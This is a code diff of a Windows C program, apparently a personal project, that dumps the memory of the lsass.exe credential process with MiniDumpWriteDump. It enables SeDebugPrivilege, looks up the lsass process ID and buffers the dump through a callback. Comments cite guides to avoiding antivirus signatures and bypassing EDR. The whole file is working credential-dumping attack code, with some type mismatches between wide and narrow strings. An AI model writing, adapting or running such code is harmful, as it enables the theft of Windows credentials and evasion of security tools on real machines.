@@ -1,9 +1,45 @@
-#include "header.h"
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <tlhelp32.h>
+#include <dbghelp.h>
+#include <winternl.h>
+#include <psapi.h>
+#pragma comment (lib, "Dbghelp.lib")
+#pragma comment (lib, "ntdll.lib")
+#pragma comment(lib, "psapi.lib")
+#pragma comment(lib, "Version.lib")
+// Observation perso : WdFilter pose pb
+
 // https://www.youtube.com/watch?v=mI3FgE1K4PE&list=PLEQL8X1EIhuMGl9dT0u-9MKDMOHFtCdmg&index=20&t=169s&ab_channel=HichamElAaouad
 // https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
 // https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6
 
 EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
+
+DWORD GetProcessIDByName(const WCHAR *processName) {
+	DWORD processID=0;
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot != INVALID_HANDLE_VALUE) {
+		PROCESSENTRY32 processEntry;
+		processEntry.dwSize = sizeof(PROCESSENTRY32);
+		if (Process32First(snapshot, &processEntry)) {
+			do {
+				char* currentProcessName = processEntry.szExeFile;
+				if (strcmp(currentProcessName, processName) == 0) {
+					printf("We found it\n");
+					processID = processEntry.th32ProcessID;
+					break;
+				}
+				else {
+					printf("%ls pid = %ld / %ls\n", currentProcessName, processEntry.th32ProcessID, processName);
+				}
+			} while (Process32Next(snapshot, &processEntry));
+		}
+		CloseHandle(snapshot);
+	}
+	return processID;
+}
 
 BOOL isElevatedProcess() {
 	BOOL isElevated = FALSE;
@@ -21,27 +57,6 @@ BOOL isElevatedProcess() {
 	return isElevated;
 }
 
-DWORD GetProcessIDByName(const char* processName) {
-	DWORD processID = 0;
-	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-	if (snapshot != INVALID_HANDLE_VALUE) {
-		PROCESSENTRY32 processEntry;
-		processEntry.dwSize = sizeof(PROCESSENTRY32);
-		if (Process32First(snapshot, &processEntry)) {
-			do {
-				char* currentProcessName = processEntry.szExeFile;
-				printf("%s %s\n", currentProcessName, processName);
-				if (currentProcessName == processName) {
-					processID = processEntry.th32ProcessID;
-					break;
-				}
-			} while (Process32Next(snapshot, &processEntry));
-		}
-		CloseHandle(snapshot);
-	}
-	return processID;
-}
 BOOL setPrivilege() {
 	const wchar_t* privName = L"SeDebugPrivilege";
 	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
@@ -72,14 +87,22 @@ EXIT:
 }
 
 
+LPVOID dumpBuffer;
+DWORD bytesRead;
+
+void encode(unsigned char* buf, size_t size) {
+	for (size_t i = 0; i < size; ++i) {
+		buf[i] = buf[i] + 1;
+	}
+}
+
 BOOL CALLBACK minidumpCallback(
 	__in     PVOID callbackParam,
 	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
 	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
 ) {
 
-	//LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
-	//DWORD bytesRead = 0;
+	static int pathnbr = 0;
 
 	LPVOID destination = 0, source = 0;
 	DWORD bufferSize = 0;
@@ -87,32 +110,91 @@ BOOL CALLBACK minidumpCallback(
 	switch (callbackInput->CallbackType)
 	{
 	case IoStartCallback:
-		printf("INIT\n");
+		printf("START %d\n", ++pathnbr);
 		callbackOutput->Status = S_FALSE;
 		break;
 	case IoWriteAllCallback:
-		printf("DATA\n");
+		printf("DATA %d\n", ++pathnbr);
 		callbackOutput->Status = S_OK;
-		/*source = callbackInput->Io.Buffer;
+		source = callbackInput->Io.Buffer;
 		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
 
 		// Size of the chunk of minidump that's just been read.
 		bufferSize = callbackInput->Io.BufferBytes;
 		bytesRead += bufferSize;
-		RtlCopyMemory(destination, source, bufferSize);*/
+		RtlCopyMemory(destination, source, bufferSize);
+		//encode(destination, bufferSize);
 		break;
-
 	case IoFinishCallback:
-		printf("END\n");
+		printf("END %d\n", ++pathnbr);
 		callbackOutput->Status = S_OK;
 		break;
 
+	case ModuleCallback:
+		printf("X ModuleCallback\n");
+		break;
+	case ThreadCallback:
+		printf("X ThreadCallback\n");
+		break;
+	case ThreadExCallback:
+		printf("X ThreadExCallback\n");
+		break;
+	case IncludeThreadCallback:
+		printf("X IncludeThreadCallback\n");
+		break;
+	case IncludeModuleCallback:
+		printf("X IncludeModuleCallback\n");
+		break;
+	case MemoryCallback:
+		printf("X MemoryCallback\n");
+		break;
+	case CancelCallback:
+		printf("X CancelCallback\n");
+		break;
+	case WriteKernelMinidumpCallback:
+		printf("X WriteKernelMinidumpCallback\n");
+		break;
+	case KernelMinidumpStatusCallback:
+		printf("X KernelMinidumpStatusCallback\n");
+		break;
+	case RemoveMemoryCallback:
+		printf("X RemoveMemoryCallback\n");
+		break;
+	case IncludeVmRegionCallback:
+		printf("X IncludeVmRegionCallback\n");
+		break;
+	case ReadMemoryFailureCallback:
+		printf("X ReadMemoryFailureCallback. Normally you should set status here ans maybe return false\n");
+		break;
+	case SecondaryFlagsCallback:
+		printf("X SecondaryFlagsCallback\n");
+		break;
+	case IsProcessSnapshotCallback:
+		printf("X IsProcessSnapshotCallback\n");
+		break;
+	case VmStartCallback:
+		printf("X VmStartCallback\n");
+		break;
+	case VmQueryCallback:
+		printf("X VmQueryCallback\n");
+		break;
+	case VmPreReadCallback:
+		printf("X VmPreReadCallback\n");
+		break;
+	case VmPostReadCallback:
+		printf("X VmPostReadCallback\n");
+		break;
 	default:
-		return TRUE;
+		printf("DEFAULT %d\n", ++pathnbr);
+		break;
 	}
 	return TRUE;
 }
-int main_mimikatz(int argc, char *argv[]) {
+int main(int argc, char *argv[]) {
+	dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
+	bytesRead = 0;
+
+
 	if (isElevatedProcess()) {
 		printf("We have the required privileges\n");
 	}
@@ -121,8 +203,8 @@ int main_mimikatz(int argc, char *argv[]) {
 		return 0;
 	}
 
-	char* processName = "lsass.exe";
-	DWORD processPID = 2032;
+	char* processName = L"lsass.exe";
+	DWORD processPID = GetProcessIDByName(processName);
 	printf("lsasspid process PID is %d\n", processPID);
 
 	if (setPrivilege()) {
@@ -133,10 +215,19 @@ int main_mimikatz(int argc, char *argv[]) {
 		return 0;
 	}
 
-	LPCSTR fileName_pointer = "lsass.dump";
+	LPCSTR fileName_pointer = L"C:\\Users\\seb\\Desktop\\whitelist\\x64\\lsa.dump";
 	HANDLE output = CreateFile(fileName_pointer, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
+
 	HANDLE processHandler = OpenProcess(accessAllow, 0, processPID);
+	if (processHandler == NULL) {
+		printf("NULL handle check pid\n");
+		exit(1);
+	}
+	if (processHandler == INVALID_HANDLE_VALUE) {
+		printf("INVALID_HANDLE_VALUE handle\n");
+		exit(1);
+	}
 
 	if (processHandler && processHandler != INVALID_HANDLE_VALUE) {
 		//patchme();
@@ -149,11 +240,16 @@ int main_mimikatz(int argc, char *argv[]) {
 		BOOL isDump = MiniDumpWriteDump(processHandler, processPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
 		//BOOL isDump = MiniDumpWriteDump(processHandler, processPID, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
 		if (isDump) {
-			printf("[+] lsass is dumped\n");
+			printf("%d\n", bytesRead);
+			DWORD bytesWritten = 0;
+			WriteFile(output, dumpBuffer, bytesRead,&bytesWritten,NULL);
+			printf("[+] lsass is dumped : %d bytes\n", bytesWritten);
 		}
 		else {
 			printf("[-] lsass is not dumped\n");
 		}
 	}
+	CloseHandle(output);
+	return 0;
 }
 /**************************************************************************/
